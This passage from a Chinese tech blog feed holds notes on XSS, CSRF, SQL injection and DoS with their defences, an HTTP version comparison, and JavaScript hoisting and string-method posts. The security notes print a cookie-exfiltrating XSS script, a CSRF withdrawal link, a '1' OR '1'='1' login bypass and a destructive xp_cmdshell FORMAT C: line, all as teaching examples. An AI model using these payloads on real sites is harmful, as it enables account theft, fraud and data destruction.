<h3 id="1-概念"><a class="markdownIt-Anchor" href="#1-概念"></a> 1. 概念</h3>
<p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。</p>
<p>例如有一个论坛网站，攻击者可以在上面发表以下内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后该内容可能会被渲染成以下形式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另一个用户浏览了含有这个内容的页面将会跳往 <a href="http://domain.com" target="_blank" rel="noopener">domain.com</a> 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h3 id="2-危害"><a class="markdownIt-Anchor" href="#2-危害"></a> 2. 危害</h3>
<ul>
<li>伪造虚假的输入表单骗取个人信息</li>
<li>窃取用户的 Cookie 值</li>
<li>显示伪造的文章或者图片</li>
</ul>
<h3 id="3-防范手段"><a class="markdownIt-Anchor" href="#3-防范手段"></a> 3. 防范手段</h3>
<p>（一）过滤特殊字符</p>
<p>许多语言都提供了对 HTML 的过滤：</p>
<ul>
<li>PHP 的 htmlentities() 或是 htmlspecialchars()。</li>
<li>Python 的 cgi.escape()。</li>
<li>Java 的 xssprotect (Open Source Library)。</li>
<li>Node.js 的 node-validator。</li>
</ul>
<p>（二）指定 HTTP 的 Content-Type</p>
<p>通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   header(<span class="string">'Content-Type: text/javascript; charset=utf-8'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="跨站点请求伪造"><a class="markdownIt-Anchor" href="#跨站点请求伪造"></a> 跨站点请求伪造</h2>
<h3 id="1-概念-2"><a class="markdownIt-Anchor" href="#1-概念-2"></a> 1. 概念</h3>
<p>跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p>
<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.examplebank.com&#x2F;withdraw?account&#x3D;AccoutName&amp;amount&#x3D;1000&amp;for&#x3D;PayeeName。</span><br></pre></td></tr></table></figure>
<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.examplebank.com&#x2F;withdraw?account&#x3D;Alice&amp;amount&#x3D;1000&amp;for&#x3D;Badman&quot;&gt;。</span><br></pre></td></tr></table></figure>
<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。</p>
<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<h3 id="2-防范手段"><a class="markdownIt-Anchor" href="#2-防范手段"></a> 2. 防范手段</h3>
<p>（一）检查 Referer 字段</p>
<p>HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<p>（二）添加校验 Token</p>
<p>由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。</p>
<h2 id="sql-注入攻击"><a class="markdownIt-Anchor" href="#sql-注入攻击"></a> SQL 注入攻击</h2>
<h3 id="1-概念-3"><a class="markdownIt-Anchor" href="#1-概念-3"></a> 1. 概念</h3>
<p>服务器上的数据库运行非法的 SQL 语句。</p>
<h3 id="2-攻击原理"><a class="markdownIt-Anchor" href="#2-攻击原理"></a> 2. 攻击原理</h3>
<p>例如一个网站登录验证的 SQL 查询代码为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'" + userName + "'</span>) <span class="keyword">and</span> (pw = <span class="string">'"+ passWord +"'</span>);"</span><br></pre></td></tr></table></figure>
<p>如果填入以下内容：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">userName = "1' OR '1'='1";</span><br><span class="line">passWord = "1' OR '1'='1";</span><br></pre></td></tr></table></figure>
<p>那么 SQL 查询字符串为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure>
<p>此时无需验证通过就能执行以下查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span>;"</span><br></pre></td></tr></table></figure>
<h3 id="3-危害"><a class="markdownIt-Anchor" href="#3-危害"></a> 3. 危害</h3>
<ul>
<li>数据表中的数据外泄，例如个人机密数据，账户数据，密码等。</li>
<li>数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。</li>
<li>数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD=‘xxxxxx’）。</li>
<li>获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。</li>
<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。</li>
<li>破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。</li>
</ul>
<h3 id="4-防范手段"><a class="markdownIt-Anchor" href="#4-防范手段"></a> 4. 防范手段</h3>
<ul>
<li>在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。</li>
<li>在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。</li>
<li>如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。</li>
<li>其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 <a href="http://ASP.NET" target="_blank" rel="noopener">ASP.NET</a> 的 SqlDataSource 对象或是 LINQ to SQL。</li>
<li>使用 SQL 防注入系统。</li>
</ul>
<h2 id="拒绝服务攻击"><a class="markdownIt-Anchor" href="#拒绝服务攻击"></a> 拒绝服务攻击</h2>
<h3 id="1-概念-4"><a class="markdownIt-Anchor" href="#1-概念-4"></a> 1. 概念</h3>
<p>（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<blockquote>
<p><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></p>
</blockquote>
<h1 id="八-各版本比较"><a class="markdownIt-Anchor" href="#八-各版本比较"></a> 八、各版本比较</h1>
<h2 id="http10-与-http11-的区别"><a class="markdownIt-Anchor" href="#http10-与-http11-的区别"></a> HTTP/1.0 与 HTTP/1.1 的区别</h2>
<p>HTTP/1.1 新增了以下内容：</p>
<ul>
<li>默认为长连接；</li>
<li>提供了范围请求功能；</li>
<li>提供了虚拟主机的功能；</li>
<li>多了一些缓存处理字段；</li>
<li>多了一些状态码。</li>
</ul>
<h2 id="http11-与-http20-的区别"><a class="markdownIt-Anchor" href="#http11-与-http20-的区别"></a> HTTP/1.1 与 HTTP/2.0 的区别</h2>
<h3 id="1-多路复用"><a class="markdownIt-Anchor" href="#1-多路复用"></a> 1. 多路复用</h3>
<p>HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求。</p>
<h3 id="2-首部压缩"><a class="markdownIt-Anchor" href="#2-首部压缩"></a> 2. 首部压缩</h3>
<p>HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。</p>
<h3 id="3-服务端推送"><a class="markdownIt-Anchor" href="#3-服务端推送"></a> 3. 服务端推送</h3>
<p>在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端。</p>
<h3 id="4-二进制格式"><a class="markdownIt-Anchor" href="#4-二进制格式"></a> 4. 二进制格式</h3>
<p>HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。</p>
<h1 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h1>
<ul>
<li>上野宣. 图解 HTTP[M]. Ren min you dian chu ban she, 2014.</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP" target="_blank" rel="noopener">MDN : HTTP</a></li>
<li><a href="https://www.webdancers.com/are-http-and-www-necesary/" target="_blank" rel="noopener">Are http:// and www really necessary?</a></li>
<li><a href="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" target="_blank" rel="noopener">HTTP (HyperText Transfer Protocol)</a></li>
<li><a href="https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/" target="_blank" rel="noopener">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a></li>
<li><a href="http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg" target="_blank" rel="noopener">File:HTTP persistent connection.svg</a></li>
<li><a href="https://en.wikipedia.org/wiki/Proxy_server" target="_blank" rel="noopener">Proxy server</a></li>
<li><a href="https://www.x-cart.com/blog/what-is-https-and-ssl.html" target="_blank" rel="noopener">What Is This HTTPS/SSL Thing And Why Should You Care?</a></li>
<li><a href="https://securebox.comodo.com/ssl-sniffing/ssl-offloading/" target="_blank" rel="noopener">What is SSL Offloading?</a></li>
<li><a href="https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html" target="_blank" rel="noopener">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a></li>
<li><a href="https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication" target="_blank" rel="noopener">An Introduction to Mutual SSL Authentication</a></li>
<li><a href="https://danielmiessler.com/study/url-uri/" target="_blank" rel="noopener">The Difference Between URLs and URIs</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">维基百科：跨站脚本</a></li>
<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：SQL 注入攻击</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">维基百科：跨站点请求伪造</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></li>
<li><a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" target="_blank" rel="noopener">What is the difference between a URI, a URL and a URN?</a></li>
</ul>
<h1 id="原博主相关扩展阅读"><a class="markdownIt-Anchor" href="#原博主相关扩展阅读"></a> 原博主相关扩展阅读</h1>
<ul>
<li><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/Linux.md" target="_blank" rel="noopener">Linux</a></li>
<li><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/SQL.md" target="_blank" rel="noopener">SQL</a></li>
<li><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/MySQL.md" target="_blank" rel="noopener">MySQL</a></li>
<li><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.md" target="_blank" rel="noopener">正则表达式</a></li>
</ul>
]]></content>
      <categories>
        <category>网络</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>正则表达式</tag>
        <tag>MySQL</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript 变量提升相关</title>
    <url>/hexolog/post/a33deebd.html</url>
    <content><![CDATA[<h3 id="什么是变量提升"><a class="markdownIt-Anchor" href="#什么是变量提升"></a> 什么是变量提升？</h3>
<p><b>变量提升</b>：把变量声明提升到<code>当前执行环境</code>的最顶端。按照js代码解析原则，js引擎在读取js代码时分两个步骤，第一个步骤是解释，第二个步骤是执行。所谓解释就是会先通篇扫描所有的Js代码，<code>然后把所有声明提升到顶端</code>；而执行就是操作一类的，依次执行解释完的代码。</p>
<h3 id="变量提升大致可分为两类"><a class="markdownIt-Anchor" href="#变量提升大致可分为两类"></a> 变量提升大致可分为两类：</h3>
<ul>
<li><code>var 声明的变量的提升</code>。只将变量声明语句提升至当前执行环境的顶端，初始化语句（若有）则依然处于原位置不动。</li>
<li><code>function 声明的函数的提升</code>。将整个函数声明语句块提升至当前执行环境顶端，同时函数在声明时就已经将函数名初始化了。若有多个，则依次往下排，即先声明的位于最前。</li>
</ul>
<a id="more"></a>
<h4 id="回顾"><a class="markdownIt-Anchor" href="#回顾"></a> 回顾</h4>
<blockquote>
<ul>
<li>一个变量的整个生命周期有三个阶段，<b>声明阶段</b>，<b>初始化阶段</b>，<b>赋值阶段</b>。只声明而未初始化的变量，其值默认为“undefined”。</li>
</ul>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> text;</span><br><span class="line">text+=<span class="string">"你好"</span>;</span><br><span class="line">alert(text);  <span class="comment">//"undefined你好"</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>没经 var 声明，而直接初始化，会定义一个全局变量。</li>
<li>注意，以表达式形式创建的函数没有提升作用。</li>
</ul>
</blockquote>
<h3 id="实例分析"><a class="markdownIt-Anchor" href="#实例分析"></a> 实例分析</h3>
<p>下面通过一些实例来了解一下吧。</p>
<ul>
<li>例子1 关于下面代码：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//"function"</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>被javascript执行引擎解释后的形态，等同于这个：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//"function"</span></span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<ul>
<li>例子2 关于下面代码：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//function </span></span><br><span class="line">	<span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//number</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>被javascript执行引擎解释后的形态，等同于这个：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//function</span></span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> a); <span class="comment">//number</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3>
<p>不少文章中说的<code>“函数声明的提升优先于变量提升”其实并不准确</code>。函数声明的提升与变量提升都是根据声明的先后顺序依次排列的，只不过“变量声明只提升变量的声明语句；而函数声明提升的是整个语句块，关键一点是，函数声明时就已经对函数名初始化了”。<br />
另外，以表达式形式创建的函数没有提升作用。</p>
<h3 id="相关阅读"><a class="markdownIt-Anchor" href="#相关阅读"></a> 相关阅读：</h3>
<p><a href="https://www.jianshu.com/p/0f49c88cf169" target="_blank" rel="noopener">let深入理解—let存在变量提升吗？</a></p>
<p>[20]:</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>变量提升</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript 字符串及数组操作方法</title>
    <url>/hexolog/post/b0e2f0cd.html</url>
    <content><![CDATA[<p>这里总结一下 js 中字符串及数组的操作方法</p>
<h3 id="字符串操作方法"><a class="markdownIt-Anchor" href="#字符串操作方法"></a> 字符串操作方法</h3>
<blockquote>
<ul>
<li><strong><code>charAt()</code></strong> 返回在指定位置的字符</li>
<li><strong><code>charCodeAt()</code></strong> 返回在指定的位置的字符的 Unicode 编码</li>
<li><strong><code>fromCharCode()</code></strong> 从字符编码创建一个字符串</li>
<li><strong><code>slice()</code></strong> 提取字符串的片断，并在新的字符串中返回被提取的部分</li>
<li><strong><code>split()</code></strong> 把字符串分割为字符串数组</li>
<li><strong><code>concat()</code></strong> 连接字符串</li>
<li><strong><code>indexOf()</code></strong> 检索字符串</li>
<li><strong><code>lastIndexOf()</code></strong> 从后向前搜索字符串。</li>
<li><strong><code>match()</code></strong> 找到一个或多个正则表达式的匹配</li>
<li><strong><code>replace()</code></strong> 替换与正则表达式匹配的子串</li>
<li><strong><code>search()</code></strong>  检索与正则表达式相匹配的值(大小写敏感)，未找到输出-1</li>
</ul>
</blockquote>
<a id="more"></a>
<hr />
<h4 id="charat"><a class="markdownIt-Anchor" href="#charat"></a> <code>charAt()</code></h4>
<p>返回在指定位置的字符</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abac_dfra_wa"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.charAt(<span class="number">3</span>)); <span class="comment">//输出 c</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="charcodeat"><a class="markdownIt-Anchor" href="#charcodeat"></a> <code>charCodeAt()</code></h4>
<p>返回在指定的位置的字符的 Unicode 编码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abac_dfra_wa"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.charCodeAt(<span class="number">3</span>)); <span class="comment">//输出99</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="fromcharcode"><a class="markdownIt-Anchor" href="#fromcharcode"></a> <code>fromCharCode()</code></h4>
<p>从字符编码创建一个字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">String</span>.fromCharCode(<span class="number">72</span>,<span class="number">69</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">79</span>)); <span class="comment">//输出HELLO</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="slice"><a class="markdownIt-Anchor" href="#slice"></a> <code>slice()</code></h4>
<p>提取字符串的片断，并在新的字符串中返回被提取的部分</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"Hello happy world!"</span></span><br><span class="line"><span class="built_in">console</span>.log(str.slice(<span class="number">6</span>)); <span class="comment">//输出happy world!</span></span><br><span class="line"><span class="built_in">console</span>.log(str.slice(<span class="number">6</span>, <span class="number">11</span>)); <span class="comment">//输出happy</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="split"><a class="markdownIt-Anchor" href="#split"></a> <code>split()</code></h4>
<p>把字符串分割为字符串数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"|a|b|c"</span>.split(<span class="string">"|"</span>) <span class="comment">////将返回["", "a", "b", "c"]</span></span><br><span class="line"></span><br><span class="line"><span class="string">"How are you doing today?"</span>.split(<span class="string">" "</span>,<span class="number">3</span>) <span class="comment">//返回 How,are,you</span></span><br><span class="line"></span><br><span class="line"><span class="string">"hello"</span>.split(<span class="string">""</span>)	<span class="comment">//可返回 ["h", "e", "l", "l", "o"]</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="concat"><a class="markdownIt-Anchor" href="#concat"></a> <code>concat()</code></h4>
<p>连接字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abac_dfra_wa"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.concat(<span class="string">'_000'</span>)); <span class="comment">//输出abac_dfra_wa_000</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="indexof"><a class="markdownIt-Anchor" href="#indexof"></a> <code>indexOf()</code></h4>
<p>检索字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abac_dfra_wa"</span>; </span><br><span class="line"><span class="built_in">console</span>.log(str.indexOf(<span class="string">'ac'</span>)); <span class="comment">//输出2</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="lastindexof"><a class="markdownIt-Anchor" href="#lastindexof"></a> <code>lastIndexOf()</code></h4>
<p>从后向前搜索字符串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abac_dfra_wa"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.lastIndexOf(<span class="string">'ac'</span>)); <span class="comment">//输出2</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="match"><a class="markdownIt-Anchor" href="#match"></a> <code>match()</code></h4>
<p>找到一个或多个正则表达式的匹配</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"1 plus 2 equal 3"</span></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="string">'plus'</span>)); <span class="comment">// plus</span></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="string">'st'</span>));   <span class="comment">// null</span></span><br><span class="line"><span class="built_in">console</span>.log(str.match(<span class="regexp">/\d+/g</span>))  <span class="comment">// [ '1', '2', '3' ]</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="replace"><a class="markdownIt-Anchor" href="#replace"></a> <code>replace()</code></h4>
<p>替换与正则表达式匹配的子串</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"Hello WoRlD!"</span></span><br><span class="line"><span class="built_in">console</span>.log(str.replace(<span class="regexp">/WoRlD/</span>, <span class="string">"World"</span>));     <span class="comment">// Hello World!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">"Hello WoRlD! "</span></span><br><span class="line">str += str;</span><br><span class="line"><span class="built_in">console</span>.log(str.replace(<span class="regexp">/WoRlD/g</span>, <span class="string">"World"</span>)); <span class="comment">//替换所有, 输出：Hello World! Hello World! </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="string">"javascript Tutorial "</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.replace(<span class="regexp">/javascript/i</span>, <span class="string">"JavaScript"</span>)); <span class="comment">//确保匹配字符串大写字符的正确</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"Doe, John"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name.replace(<span class="regexp">/(\w+)\s*, \s*(\w+)/</span>, <span class="string">"$2 $1"</span>)); <span class="comment">//将把 "Doe, John" 转换为 "John Doe" 的形式</span></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="search"><a class="markdownIt-Anchor" href="#search"></a> <code>search()</code></h4>
<p>检索与正则表达式相匹配的值(大小写敏感)，未找到输出-1</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="string">"Hello World!"</span></span><br><span class="line"><span class="built_in">console</span>.log(str.search(<span class="regexp">/World/</span>)); <span class="comment">//输出6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">"Hello World!"</span></span><br><span class="line"><span class="built_in">console</span>.log(str.search(<span class="regexp">/world/i</span>)); <span class="comment">//忽略大小写的检索，输出6</span></span><br></pre></td></tr></table></figure>
<hr />
<h3 id="数组操作方法"><a class="markdownIt-Anchor" href="#数组操作方法"></a> 数组操作方法</h3>
<blockquote>
<ul>
<li><strong><code>shift()</code></strong> 删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined</li>
<li><strong><code>unshift()</code></strong> 将参数添加到原数组开头，并返回新数组的长度</li>
<li><strong><code>pop()</code></strong> 删除原数组最后一项，并返回删除元素的值；如果数组为空则返回undefined</li>
<li><strong><code>push()</code></strong> 将参数添加到原数组末尾，并返回数组的长度</li>
<li><strong><code>concat()</code></strong> 回一个新数组，是将参数添加到原数组中构成的</li>
<li><strong><code>splice(start,deleteCount,val1,val2,...)</code></strong> 从start位置开始删除deleteCount项，并从该位置起插入val1,val2,…</li>
<li><strong><code>reverse()</code></strong> 将数组反序</li>
<li><strong><code>sort(orderfunction)</code></strong> 按指定的参数对数组进行排序</li>
<li><strong><code>slice(start,end)</code></strong> 返回从原数组中指定开始下标到结束下标之间的项组成的新数组</li>
<li><strong><code>join(separator)</code></strong> 将数组的元素组起一个字符串，以separator为分隔符，省略的话则用默认用逗号为分隔符</li>
</ul>
</blockquote>
<hr />
<h4 id="shift"><a class="markdownIt-Anchor" href="#shift"></a> <code>shift()</code></h4>
<p>删除原数组第一项，并返回删除元素的值；如果数组为空则返回undefined</p>
